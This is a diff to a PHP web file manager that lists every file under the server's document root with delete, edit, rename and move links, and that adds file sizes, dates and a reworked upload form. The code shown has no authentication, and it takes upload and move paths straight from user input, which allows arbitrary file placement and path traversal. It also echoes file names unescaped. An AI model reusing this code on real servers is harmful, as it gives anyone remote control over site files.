@@ -59,7 +59,7 @@
             padding-left: 20px;
         }
         input[type="file"] {
-            display: none;
+            display: inline-block;
         }
     </style>
 </head>
@@ -68,15 +68,23 @@
 function listDirectory($dir) {
     $files = scandir($dir);
     echo '<ul>';
+    $fileCount = 0;
     foreach ($files as $file) {
         if ($file != "." && $file != "..") {
             $path = $dir . DIRECTORY_SEPARATOR . $file;
             echo '<li>';
             if (is_dir($path)) {
+                // If it's a directory, list it and count files inside
                 echo '<span class="folder" onclick="toggleFolder(this)">' . $file . '</span>';
-                listDirectory($path);
+                $fileCount += listDirectory($path);
+                echo '<span>Total File: ' . $fileCount . '</span>';
             } else {
-                echo $file . ' <a href="?action=delete&file=' . urlencode($path) . '" class="button">Delete</a> <a href="?action=edit&file=' . urlencode($path) . '" class="button">Edit</a> <a href="?action=rename&file=' . urlencode($path) . '" class="button">Rename</a> <form method="post" style="display:inline;"><input type="hidden" name="sourceFile" value="' . htmlspecialchars($file) . '"><input type="text" name="targetDir" placeholder="Target Directory"><input type="submit" value="Move" class="button"></form>';
+                // If it's a file, display file name, size, and creation date
+                $fileSize = filesize($path);
+                $fileCreationTime = filectime($path);
+                echo $file . ' Size: ' . $fileSize . 'kb , Created: ' . date("Y-m-d H:i:s", $fileCreationTime);
+                $fileCount++;
+                echo ' <a href="?action=delete&file=' . urlencode($path) . '" class="button">Delete</a> <a href="?action=edit&file=' . urlencode($path) . '" class="button">Edit</a> <a href="?action=rename&file=' . urlencode($path) . '" class="button">Rename</a> <form method="post" style="display:inline;"><input type="hidden" name="sourceFile" value="' . htmlspecialchars($file) . '"><input type="text" name="targetDir" placeholder="Target Directory"><input type="submit" value="Move" class="button"></form>';
             }
             echo '</li>';
         }
@@ -141,14 +149,6 @@ if (isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['file']
 
 echo '<h2>Files:</h2>';
 listDirectory($_SERVER['DOCUMENT_ROOT']);
-
-echo '<h2>Actions:</h2>';
-echo '<form method="post" enctype="multipart/form-data">';
-echo '<input type="file" name="file">';
-echo '<input type="text" name="targetDir" placeholder="Target Directory">';
-echo '<input type="submit" value="Upload File" class="button">';
-echo '</form>';
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['sourceFile']) && isset($_POST['targetDir'])) {
         $sourceFile = $_POST['sourceFile'];
@@ -163,20 +163,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
+echo '<h2>Actions:</h2>';
+echo '<form method="post" enctype="multipart/form-data"><br>';
+echo 'Select File: <input type="file" name="file" value="File To Upload"><br>'; // File selection input
+echo 'Target Dir: <input type="text" name="targetDir" value="/public_html/" readonly><br>'; // Target directory input
+echo '<input type="submit" value="Upload" class="button">';
+echo '</form>';
+
+// Handle file uploading and moving
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $fileTmpName = $_FILES['file']['tmp_name'];
-    $fileName = basename($_FILES['file']['name']);
-    $targetDir = $_POST['targetDir'];
-    $uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $targetDir . DIRECTORY_SEPARATOR . $fileName;
-    if (move_uploaded_file($fileTmpName, $uploadDirectory)) {
-        echo '<div style="color: green;">File ' . $fileName . ' has been uploaded successfully to ' . $targetDir . ' directory.</div>';
-    } else {
-        echo '<div style="color: red;">There was an error uploading the file.</div>';
+    if (isset($_FILES['file'])) {
+        $fileTmpName = $_FILES['file']['tmp_name'];
+        $fileName = basename($_FILES['file']['name']);
+        $targetDir = $_POST['targetDir'];
+        $uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $targetDir . DIRECTORY_SEPARATOR . $fileName;
+        $fileSize = $_FILES['file']['size']; // Get file size
+        $fileCreationTime = filectime($fileTmpName); // Get file creation time
+        if (move_uploaded_file($fileTmpName, $uploadDirectory)) {
+            echo '<div style="color: green;">File ' . $fileName . ' (' . $fileSize . ' bytes, created: ' . date("Y-m-d H:i:s", $fileCreationTime) . ') has been uploaded successfully to ' . $targetDir . ' directory.</div>'; // Display file size and creation time
+        } else {
+            echo '<div style="color: red;">There was an error uploading the file.</div>';
+        }
     }
 }
-
-echo '</div>';
 ?>
+</div>
 
 <script>
 function toggleFolder(element) {
